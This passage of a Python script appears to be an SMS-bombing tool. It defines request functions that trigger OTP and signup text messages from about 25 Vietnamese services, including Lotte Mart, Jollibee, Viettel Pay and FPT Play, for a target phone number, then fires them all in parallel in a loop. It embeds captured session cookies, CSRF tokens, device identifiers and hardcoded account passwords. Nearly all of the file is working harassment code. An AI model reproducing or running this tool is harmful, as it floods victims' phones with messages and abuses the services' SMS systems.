sessionid=eyJpdiI6IjVTRTI2cTdmVFBodUxOZTBNQlpkUHc9PSIsInZhbHVlIjoiNkpRemhqaGVhRFpXVzNRaXB1djI3dmIwdzdXTnVvYXdFcDNTRFdERHhVcjAwRHJHbjYwTGRadFV4b0Y3eGg2Y1p1Rnk0MWRaVWNrcnYwUmhESE9RYU8rS0R0Q3V2c05XNktOYVpNbVhiR25mWHgrYWpFaDVKM1lHclJtVmlXaHUiLCJtYWMiOiIwODNjYmE0YzhkMGNmZGNmZTMxZDY1Njg1OTMyMTYyNTNiZjU3ZmI4OWZkY2ExNTgxODgxMWEwMThlOTM4YTc4IiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IkFuYkRBMm1nK0gweStNQ3V1N1hsSHc9PSIsInZhbHVlIjoidU8xOFd0RXFPVVRXTkRDTXlka1dmaWNUaVJQUGIyaXJZeStiSEpzMVVyZDdKZDNwOU5OR0ZxS1k4TEJHNHJqWG1mdVpYaStnM2xTNlR0c2tzaGZ0WE1VdUpmcCtRMDhKMThqaHdkR1pzWUFVU2wxNFNxRUhhaytiLzZQaDg4dnEiLCJtYWMiOiJmZjBlMGQzODU2NmM2YzlmMzBmNTZjMGYyZGNkMmJjM2E2N2E2ZTBkZDUxYmVkMzc3ODUyMzU5NjkxYjg0ZGMyIiwidGFnIjoiIn0%3D',
        'dnt': '1',
        'origin': 'https://vietloan.vn',
        'priority': 'u=1, i',
        'referer': 'https://vietloan.vn/login',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': sdt,
        '_token': 'sO6TL7sYpmkb3AjlLFbr0YlS1ZiTenPujaUkvGpA',
    }

    response = requests.post('https://vietloan.vn/register/phone-resend', cookies=cookies, headers=headers, data=data)
    print("\x1b[1;37m[\033[1;32mSUCCESS SEND\x1b[1;37m]\033[1;33m VIETLOAN-APICALL\033[00m |\033[96m\033[1m\033[96m ", response.text)
def foodmap(sdt):
    cookies = {
        'getLocationPickUp': 'eyJpdiI6ImYyZlwvREREbUJJUUZoT3M4MjdldG5RPT0iLCJ2YWx1ZSI6InFJdGRRNlBYajJpcXJFVE1HTGZtTHc9PSIsIm1hYyI6IjhkMDdhYTcwNjg3MTA5NjcxMDJmODljM2MwZjYxYzExZDA0MzcwZThiNDczZDVmMzRlYjRlY2U1MDAzZTk5MzEifQ%3D%3D',
        'XSRF-TOKEN': 'eyJpdiI6IlwvdmZHOXR3cWJ4VzdpOHNuS1BvUW1RPT0iLCJ2YWx1ZSI6IjJUYzFHS3hpS1dwVWtcL2RmaTlhRGJqMlZyYkhcLzFXWXdUaEw0RDkyU1ZoZk85U2ZMVU1rOXB2QnA5QklFNUhGTCIsIm1hYyI6ImJjNGIxMmNiZjNiMjNlNDMzMmU2OGZlOTkxOWVlMjRlYWVkYzNjMDFlZmI5ZjdlMzIxNzI0Y2E4YzgzZmZjZGMifQ%3D%3D',
        'fleetcart_session': 'eyJpdiI6IkQxRml0d3F1bkFyR2tDb1YwM0xGUFE9PSIsInZhbHVlIjoiU3lRT0JZZEpFd0EzZ3VrWnJ6eHpXbFwvTTFiU0hJY2doVkh1RUYyMXhkeUpjZWxMQnRTOTFqS09zTDZ1djNsWHEiLCJtYWMiOiIxZjkwYjgyYjEzMmJjODVhZGZjZWUxMzc1ZWNmODkwNTI1OWQ0YjU4Njc2OGYzOTdmMjliYzNjMDQwY2ZjNjdiIn0%3D',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi,vi-VN;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        # 'Cookie': 'getLocationPickUp=eyJpdiI6ImYyZlwvREREbUJJUUZoT3M4MjdldG5RPT0iLCJ2YWx1ZSI6InFJdGRRNlBYajJpcXJFVE1HTGZtTHc9PSIsIm1hYyI6IjhkMDdhYTcwNjg3MTA5NjcxMDJmODljM2MwZjYxYzExZDA0MzcwZThiNDczZDVmMzRlYjRlY2U1MDAzZTk5MzEifQ%3D%3D; XSRF-TOKEN=eyJpdiI6IlwvdmZHOXR3cWJ4VzdpOHNuS1BvUW1RPT0iLCJ2YWx1ZSI6IjJUYzFHS3hpS1dwVWtcL2RmaTlhRGJqMlZyYkhcLzFXWXdUaEw0RDkyU1ZoZk85U2ZMVU1rOXB2QnA5QklFNUhGTCIsIm1hYyI6ImJjNGIxMmNiZjNiMjNlNDMzMmU2OGZlOTkxOWVlMjRlYWVkYzNjMDFlZmI5ZjdlMzIxNzI0Y2E4YzgzZmZjZGMifQ%3D%3D; fleetcart_session=eyJpdiI6IkQxRml0d3F1bkFyR2tDb1YwM0xGUFE9PSIsInZhbHVlIjoiU3lRT0JZZEpFd0EzZ3VrWnJ6eHpXbFwvTTFiU0hJY2doVkh1RUYyMXhkeUpjZWxMQnRTOTFqS09zTDZ1djNsWHEiLCJtYWMiOiIxZjkwYjgyYjEzMmJjODVhZGZjZWUxMzc1ZWNmODkwNTI1OWQ0YjU4Njc2OGYzOTdmMjliYzNjMDQwY2ZjNjdiIn0%3D',
        'DNT': '1',
        'Referer': 'https://foodmap.asia/collections/di-cho-online',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    response = requests.get(f'https://foodmap.asia/register/otp/resend-otp/{sdt}', cookies=cookies, headers=headers)
    print("\x1b[1;37m[\033[1;32mSUCCESS SEND\x1b[1;37m]\033[1;33m FOODMAP\033[00m |\033[96m\033[1m\033[96m ", response.text)
def futaexpress(sdt):
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi,vi-VN;q=0.9,en;q=0.8',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://futaexpress.vn',
        'priority': 'u=1, i',
        'referer': 'https://futaexpress.vn/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    }

    json_data = {
        'phoneNumber': sdt,
        'deviceId': 'client',
    }

    response = requests.post('https://api.vato.vn/api/authenticate/request_code', headers=headers, json=json_data)
    print("\x1b[1;37m[\033[1;32mSUCCESS SEND\x1b[1;37m]\033[1;33m FUTA\033[00m |\033[96m\033[1m\033[96m ", response.text)
def lottemart(sdt):
    cookies = {
        '__Host-next-auth.csrf-token': '9fae400bc673aa3337e318a8ccb4e8352824edc645ca53c3e3e29d1fa467c2ef%7C397126c664e41ff39973c5f0f0141301d850e521f8a79b7144ce2b55d047b211',
        '__Secure-next-auth.callback-url': 'https%3A%2F%2Fwww.lottemart.vn',
    }

    headers = {
        'accept': 'application/json',
        'accept-language': 'vi,vi-VN;q=0.9,en;q=0.8',
        'content-type': 'application/json',
        # 'cookie': '__Host-next-auth.csrf-token=9fae400bc673aa3337e318a8ccb4e8352824edc645ca53c3e3e29d1fa467c2ef%7C397126c664e41ff39973c5f0f0141301d850e521f8a79b7144ce2b55d047b211; __Secure-next-auth.callback-url=https%3A%2F%2Fwww.lottemart.vn',
        'dnt': '1',
        'origin': 'https://www.lottemart.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.lottemart.vn/signup?callbackUrl=https://www.lottemart.vn/vi-nsg/product/sai-gon-lager-330ml-x-24-18935012413328-p10826',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    }

    json_data = {
        'username': sdt,
        'case': 'register',
    }

    response = requests.post(
        'https://www.lottemart.vn/v1/p/mart/bos/vi_nsg/V1/mart-sms/sendotp',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
    print("\x1b[1;37m[\033[1;32mSUCCESS SEND\x1b[1;37m]\033[1;33m LOTTEMART\033[00m |\033[96m\033[1m\033[96m ", response.text)
def kingfood(sdt):
    headers = {
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'DNT': '1',
        'domain': 'kingfoodmart',
        'sec-ch-ua-mobile': '?0',
        'authorization': '',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'content-type': 'application/json',
        'accept': '*/*',
        'Referer': 'https://kingfoodmart.com/',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'operationName': 'SendOTP',
        'variables': {
            'phone': sdt,
        },
        'query': 'mutation SendOTP($phone: String!) {\n  sendOtp(input: {phone: $phone, captchaSignature: "", email: ""}) {\n    otpTrackingId\n    __typename\n  }\n}',
    }

    response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data)
    print("\x1b[1;37m[\033[1;32mSUCCESS SEND\x1b[1;37m]\033[1;33m KINGFOOD\033[00m |\033[96m\033[1m\033[96m ", response.text)
def kiotviet(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,vi-VN;q=0.9,en;q=0.8',
        'authentication-id': '4ddb0c88-9b75-4f1d-9d47-aa8c07d6e0be',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://connect.kiotviet.vn',
        'priority': 'u=1, i',
        'referer': 'https://connect.kiotviet.vn/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': sdt,
    }

    response = requests.post('https://api-kvc.kiotviet.vn/api/v1/kvc/send-otp', headers=headers, json=json_data)
    print("\x1b[1;37m[\033[1;32mSUCCESS SEND\x1b[1;37m]\033[1;33m KIOTVIET\033[00m |\033[96m\033[1m\033[96m ", response.text)
def vinwonders(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN',
        'content-type': 'application/json; charset=UTF-8',
        'dnt': '1',
        'origin': 'https://booking.vinwonders.com',
        'priority': 'u=1, i',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    }

    json_data = {
        'channel': 10,
        'UserName': sdt,
        'Type': 1,
        'OtpChannel': 1,
    }

    response = requests.post(
        'https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp',
        headers=headers,
        json=json_data,
    )
    print("\x1b[1;37m[\033[1;32mSUCCESS SEND\x1b[1;37m]\033[1;33m VINWONDERS\033[00m |\033[96m\033[1m\033[96m ", response.text)
def jollibee(sdt):
    cookies = {
        'PHPSESSID': 'dkmvp0dj7kvs4gr0tjk44ubsdm',
        'mage-cache-storage': '%7B%7D',
        'mage-cache-storage-section-invalidation': '%7B%7D',
        'mage-cache-sessid': 'true',
        'form_key': 'Js74ET20hvRrtYw8',
        'mage-messages': '',
        'recently_viewed_product': '%7B%7D',
        'recently_viewed_product_previous': '%7B%7D',
        'recently_compared_product': '%7B%7D',
        'recently_compared_product_previous': '%7B%7D',
        'product_data_storage': '%7B%7D',
        'csp': '2',
        'csd': '25',
        'private_content_version': '6b916b7632183549972a79bef2f9185f',
        'section_data_ids': '%7B%22amfacebook-pixel%22%3A1718067566%2C%22apptrian_tiktokpixelapi_matching_section%22%3A1718067566%2C%22notification_count%22%3A1718067566%2C%22product_area_price%22%3A1718067551%2C%22messages%22%3Anull%2C%22customer%22%3Anull%2C%22compare-products%22%3Anull%2C%22last-ordered-items%22%3Anull%2C%22cart%22%3Anull%2C%22directory-data%22%3Anull%2C%22captcha%22%3Anull%2C%22instant-purchase%22%3Anull%2C%22loggedAsCustomer%22%3Anull%2C%22persistent%22%3Anull%2C%22review%22%3Anull%2C%22wishlist%22%3Anull%2C%22ammessages%22%3Anull%2C%22customer_voucher%22%3Anull%2C%22recently_viewed_product%22%3Anull%2C%22recently_compared_product%22%3Anull%2C%22product_data_storage%22%3Anull%2C%22paypal-billing-agreement%22%3Anull%7D',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi,vi-VN;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'PHPSESSID=dkmvp0dj7kvs4gr0tjk44ubsdm; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; form_key=Js74ET20hvRrtYw8; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; csp=2; csd=25; private_content_version=6b916b7632183549972a79bef2f9185f; section_data_ids=%7B%22amfacebook-pixel%22%3A1718067566%2C%22apptrian_tiktokpixelapi_matching_section%22%3A1718067566%2C%22notification_count%22%3A1718067566%2C%22product_area_price%22%3A1718067551%2C%22messages%22%3Anull%2C%22customer%22%3Anull%2C%22compare-products%22%3Anull%2C%22last-ordered-items%22%3Anull%2C%22cart%22%3Anull%2C%22directory-data%22%3Anull%2C%22captcha%22%3Anull%2C%22instant-purchase%22%3Anull%2C%22loggedAsCustomer%22%3Anull%2C%22persistent%22%3Anull%2C%22review%22%3Anull%2C%22wishlist%22%3Anull%2C%22ammessages%22%3Anull%2C%22customer_voucher%22%3Anull%2C%22recently_viewed_product%22%3Anull%2C%22recently_compared_product%22%3Anull%2C%22product_data_storage%22%3Anull%2C%22paypal-billing-agreement%22%3Anull%7D',
        'dnt': '1',
        'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjM0MjA2MDQiLCJhcCI6IjEzODU5MjEyNzYiLCJpZCI6IjcwNjQ2NjU4ZDNlYjQ5NDkiLCJ0ciI6IjYyODQ2MTY4ZmU1ZjU5ZTY3NDg3MDAzZjUyY2RkODE3IiwidGkiOjE3MTgwNjY2MTMxMzV9fQ==',
        'origin': 'https://jollibee.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://jollibee.com.vn/customer/account/create/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'traceparent': '00-62846168fe5f59e67487003f52cdd817-70646658d3eb4949-01',
        'tracestate': '3420604@nr=0-1-3420604-1385921276-70646658d3eb4949----1718066613135',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'x-newrelic-id': 'VwIFUVBTDBABV1FaDwAOUFUD',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'form_key': 'Js74ET20hvRrtYw8',
        'success_url': '',
        'error_url': '',
        'lastname': 'hoa',
        'firstname': 'hao',
        'phone': sdt,
        'email': 'apispamsms@gmail.com',
        'password': '8H5FicS@szUmQF7',
        'password_confirmation': '8H5FicS@szUmQF7',
        'dob': '08/04/1976',
        'gender': '2',
        'province_customer': '2',
        'agreement': '1',
        'otp_type': 'create',
        'ip': '14.168.56.217',
    }

    response = requests.post('https://jollibee.com.vn/otp/action/getOTP', cookies=cookies, headers=headers, data=data)
    print("\x1b[1;37m[\033[1;32mSUCCESS SEND\x1b[1;37m]\033[1;33m JOLLIBEE\033[00m |\033[96m\033[1m\033[96m", response.text)
def medlatec(sdt):
    cookies = {
        '.Smart.Antiforgery': 'CfDJ8HUn4Mljo59EteCvIogLJbSEDYhQtrM5hOFmu2T9BHzU-ZML16e_YRvujD1YKZyeZZncEi1T_MdOHSg2R4BYwTzOmGnQ0Vlpqp1VYAx4NQJMs2olmI8vUmXX9SrU91cjQ9aZEqR10mgGh0sZNmDe8Do',
        'SERVERID': 'web43_4',
        'view_banner_21': '1',
        '.Smart.Identity': 'CfDJ8HUn4Mljo59EteCvIogLJbRpZEWYJWHUioLH0AitYR2SLi9bJF82iabAF3wHwDSaSuZoKYO08oa3GX39_m7LHS8tZxcVZuBkuvDdv8k1ifXhmrRelmF7GR3XG46v8LrS6VaM-1bcRNBHzDpQoxzPO-bs68bfYQJBkDobi1IkAxaVBYz2WG99xxtumN1ze0lDp7ydC-Z1WcBVhaAxUuhLjure8poPyoHaiUwGC484fWJt5juVVQsYX-e-nIW5AZtP1Z3_iq7YB8lzN1Fae43KGwPQwAKNP1XND7LVhvX2T9d4OoXwPQJFYTPXIOpDT-vugMMFbrAXj-_AjMTEhOwy7uuOY65vFf_fFhmaWuU-JvrOOJRB6LkEBCICiWIoz3YJfpkhyMeIItR-mb5YqDsfCaldpLgojfHiL6dy9V1LhBfH5mQ0K0qVL83-QF8Utd7qatbNyQHtQNmDCm0Om3Gvd7SbejZp53Qv2A_sDM8rNcylYs3d9vVJtMg8vM8f0Px6DNiuoPGRsTk9AfTzkXKYduSzu7K4DBFELICCyeBaOixr5dVec2kzqqJMbu5KiSa1Os0XHvHePZU8ArGT2d7O4kQ',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi,vi-VN;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        # 'Cookie': '.Smart.Antiforgery=CfDJ8HUn4Mljo59EteCvIogLJbSEDYhQtrM5hOFmu2T9BHzU-ZML16e_YRvujD1YKZyeZZncEi1T_MdOHSg2R4BYwTzOmGnQ0Vlpqp1VYAx4NQJMs2olmI8vUmXX9SrU91cjQ9aZEqR10mgGh0sZNmDe8Do; SERVERID=web43_4; view_banner_21=1; .Smart.Identity=CfDJ8HUn4Mljo59EteCvIogLJbRpZEWYJWHUioLH0AitYR2SLi9bJF82iabAF3wHwDSaSuZoKYO08oa3GX39_m7LHS8tZxcVZuBkuvDdv8k1ifXhmrRelmF7GR3XG46v8LrS6VaM-1bcRNBHzDpQoxzPO-bs68bfYQJBkDobi1IkAxaVBYz2WG99xxtumN1ze0lDp7ydC-Z1WcBVhaAxUuhLjure8poPyoHaiUwGC484fWJt5juVVQsYX-e-nIW5AZtP1Z3_iq7YB8lzN1Fae43KGwPQwAKNP1XND7LVhvX2T9d4OoXwPQJFYTPXIOpDT-vugMMFbrAXj-_AjMTEhOwy7uuOY65vFf_fFhmaWuU-JvrOOJRB6LkEBCICiWIoz3YJfpkhyMeIItR-mb5YqDsfCaldpLgojfHiL6dy9V1LhBfH5mQ0K0qVL83-QF8Utd7qatbNyQHtQNmDCm0Om3Gvd7SbejZp53Qv2A_sDM8rNcylYs3d9vVJtMg8vM8f0Px6DNiuoPGRsTk9AfTzkXKYduSzu7K4DBFELICCyeBaOixr5dVec2kzqqJMbu5KiSa1Os0XHvHePZU8ArGT2d7O4kQ',
        'DNT': '1',
        'Referer': 'https://medlatec.vn/tin-tuc/cac-loai-thuc-pham-dinh-duong-nhat-ban-khong-nen-bo-qua',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    response = requests.get(
        f'https://medlatec.vn/Auth/ReSendOTP?tempOTP=TemplateOTP_Register_SMS&cid=750618&issfor={sdt}&pass=acgXhjPX@QFAS8&_=1718162884323',
        cookies=cookies,
        headers=headers,
    )
    print("\x1b[1;37m[\033[1;32mSUCCESS SEND\x1b[1;37m]\033[1;33m MEDLATEC\033[00m |\033[96m\033[1m\033[96m", response.text)
def emartmall(sdt):
    cookies = {
        'language': 'vietn',
        'currency': 'VND',
        'emartsess': 'nqu8hphhe3ecp5pqqe46h0fb13',
        'default': '3366f6d5def08d7e7416165463',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi,vi-VN;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'language=vietn; currency=VND; emartsess=nqu8hphhe3ecp5pqqe46h0fb13; default=3366f6d5def08d7e7416165463',
        'DNT': '1',
        'Origin': 'https://emartmall.com.vn',
        'Referer': 'https://emartmall.com.vn/index.php?route=account/register',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'mobile': sdt,
    }

    response = requests.post(
        'https://emartmall.com.vn/index.php?route=account/register/smsRegister',
        cookies=cookies,
        headers=headers,
        data=data,
    )
    print("\x1b[1;37m[\033[1;32mSUCCESS SEND\x1b[1;37m]\033[1;33m EMARTMALL\033[00m |\033[96m\033[1m\033[96m", response.text)
def viettelmoney(sdt):
    headers = {
        'Host': 'api8.viettelpay.vn',
        'Product': 'VIETTELPAY',
        'Accept-Language': 'vi',
        'Authority-Party': 'APP',
        'Channel': 'APP',
        'Type-Os': 'android',
        'App-Version': '6.8.18',
        'Os-Version': '7.1.2',
        'Imei': 'VTP_DAABF3BEB6673367B17444EBE58A6441',
        'X-Request-Id': '20240613042707',
        'Content-Type': 'application/json; charset=UTF-8',
        # 'Content-Length': '194',
        # 'Accept-Encoding': 'gzip, deflate',
        'User-Agent': 'okhttp/4.10.0',
    }

    json_data = {
        'hash': '',
        'identityType': 'msisdn',
        'identityValue': sdt,
        'imei': '',
        'notifyToken': '',
        'otp': 'android',
        'pin': '',
        'transactionId': '',
        'type': 'REGISTER',
        'typeOs': 'android',
        'verifyMethod': 'sms',
    }

    response = requests.post('https://api8.viettelpay.vn/customer/v2/accounts/register', headers=headers, json=json_data, verify=False)
    print("\x1b[1;37m[\033[1;32mSUCCESS SEND\x1b[1;37m]\033[1;33m VIETTEL MONEY\033[00m |\033[96m\033[1m\033[96m", response.text)
def gapo(sdt):
    headers = {
        'Host': 'api.gapowork.vn',
        'Accept': 'application/json; charset=utf-8',
        'X-Gapo-Lang': 'vi',
        'User-Agent': 'GapoWork/4.5.2 (Android 7.1.2; ASUS_Z01QD; asus ASUS_l001_1)',
        'Content-Type': 'application/json; charset=UTF-8',
        # 'Content-Length': '127',
        # 'Accept-Encoding': 'gzip, deflate',
    }

    json_data = {
        'phone_number': sdt,
        'device_id': 'a2d58cb7-606f-4ec9-9e0e-0efa1711f807',
        'device_model': 'ASUS_Z01QD',
        'new_domain': False,
    }

    response = requests.post('https://api.gapowork.vn/auth/v3.1/signup', headers=headers, json=json_data, verify=False)
    print("\x1b[1;37m[\033[1;32mSUCCESS SEND\x1b[1;37m]\033[1;33m GAPO\033[00m |\033[96m\033[1m\033[96m", response.text)
def sdong(sdt):
    headers = {
        'Host': 'jiekou.sdongapp.com',
        'Androidid': '9b5f8181-4da8-43e4-a3c5-3b705a5963a1',
        'Language': 'in',
        'Packagename': 'vm.sdong.app.loan',
        'Pushtoken': 'fWL4iwvlQwa2JlME7BfOzX:APA91bFw77CZbRAFfbUujds5s1HIW5lSiFwSHR6D2IePEhLLXC0kEU671lKNwNSJ_Nu-1tilyUpgMGNGRyCgsDoJDdPxWOdylGJWp6UgAuU04YLPMG0rhXruN2wKEiyzmfDgMDPEobu6',
        'Appversioncode': '12',
        'Firebaseappinstanceid': '9d67734b883a062c3c2ff6a91d4bb899',
        'Content-Type': 'application/json; charset=UTF-8',
        'Content-Length': '60',
        'Accept-Encoding': 'gzip, deflate',
        'User-Agent': 'okhttp/3.14.9',
        'Connection': 'close',
    }

    json_data = {
        'imgVerifyDistance': '111',
        'mobile': sdt,
        'type': '1',
    }

    response = requests.post('https://jiekou.sdongapp.com/ueufhw/jiejewjcnxyy', headers=headers, json=json_data, verify=False)
    print("\x1b[1;37m[\033[1;32mSUCCESS SEND\x1b[1;37m]\033[1;33m SDONG\033[00m |\033[96m\033[1m\033[96m", response.text)
def bibabo(sdt):
    headers = {
        'Host': 'one.bibabo.vn',
        'Accept': 'application/json, text/plain, */*',
        # 'Accept-Encoding': 'gzip, deflate',
        'User-Agent': 'okhttp/4.9.2',
        'Connection': 'close',
    }

    params = {
        'phone': sdt,
        'reCaptchaToken': 'undefined',
        'appId': '7',
        'version': '2',
    }

    response = requests.get('https://one.bibabo.vn/api/v1/login/otp/createOtp', params=params, headers=headers, verify=False)
    print("\x1b[1;37m[\033[1;32mSUCCESS SEND\x1b[1;37m]\033[1;33m BIBABO\033[00m |\033[96m\033[1m\033[96m", response.text)
def fptplay(sdt):
    headers = {
        'Host': 'api.fptplay.net',
        'St': 'm7nCS--9HEng8f2RoGcnrw',
        'E': '1718249119',
        'User-Agent': 'Mozilla/5.0 (compatible; MSIE 10.0; FPT Play Mobile (version:7.1.2,model:ASUS_Z01QD); Trident/6.0; IEMobile/10.0; ARM; Touch; asus; ASUS_Z01QD)',
        'X-Did': '5ec6a6453646d627',
        'Content-Type': 'application/json; charset=UTF-8',
        # 'Content-Length': '97',
        # 'Accept-Encoding': 'gzip, deflate',
    }

    json_data = {
        'phone': sdt,
        'client_id': 'LVmko1C7tFMMZJUFew4SuMbvbuyYRDRNyzhrqRft',
        'country_code': 'VN',
    }

    response = requests.post(
        'https://api.fptplay.net/api/v7.1_a/user/otp/register_otp?serial_number=&drm_id=&drm=0&fhd=0&st=m7nCS--9HEng8f2RoGcnrw&e=1718249119&version=7.14.8&version_code=1354&source=mobile_normal&uSKBC=true&cachedByUrls=true&nettype=wifi&device=FPT%20Play%20Mobile%20%28version:7.1.2%2Cmodel:ASUS_Z01QD%29&mac_address=&mac_addr=5ec6a6453646d627&deviceWidth=900&deviceHeight=1600',
        headers=headers,
        json=json_data,
        verify=False,
    )
    print("\x1b[1;37m[\033[1;32mSUCCESS SEND\x1b[1;37m]\033[1;33m FPTPLAY\033[00m |\033[96m\033[1m\033[96m", response.text)
def run(sdt,i):      

  threading.submit(fptshop,sdt)#1            
  threading.submit(tv360,sdt)#2
  threading.submit(myviettel,sdt)#5
  threading.submit(winmart,sdt)#5
  threading.submit(tgdd,sdt)#5
  threading.submit(chotot,sdt)#5
  threading.submit(batdongsan,sdt)#5
  threading.submit(thepizzacom,sdt)#5
  threading.submit(hasaki,sdt)#5
  threading.submit(ghn,sdt)#5
  threading.submit(vietloan_apicall,sdt)#5
  threading.submit(foodmap,sdt)#5
  threading.submit(futaexpress,sdt)#5
  threading.submit(lottemart,sdt)#5
  threading.submit(kingfood,sdt)#5
  threading.submit(kiotviet,sdt)#5
  threading.submit(vinwonders,sdt)#5
  threading.submit(jollibee,sdt)#5
  threading.submit(medlatec,sdt)#5
  threading.submit(emartmall,sdt)#5
  threading.submit(viettelmoney,sdt)#5
  threading.submit(gapo,sdt)#5
  threading.submit(sdong,sdt)#5
  threading.submit(bibabo,sdt)#5
  threading.submit(fptplay,sdt)#5

  print("Success Send Sms | Api - Mode | Delay : 0.00000.1 | Status : SUCCESSFULLY @",)  
  for j in range(0, 5):
    # code trong vòng lặp
    print(f" API SMS BY DUYHOANG\r",end="")
    
for i in range(1,count+1):
  run(sdt,i)
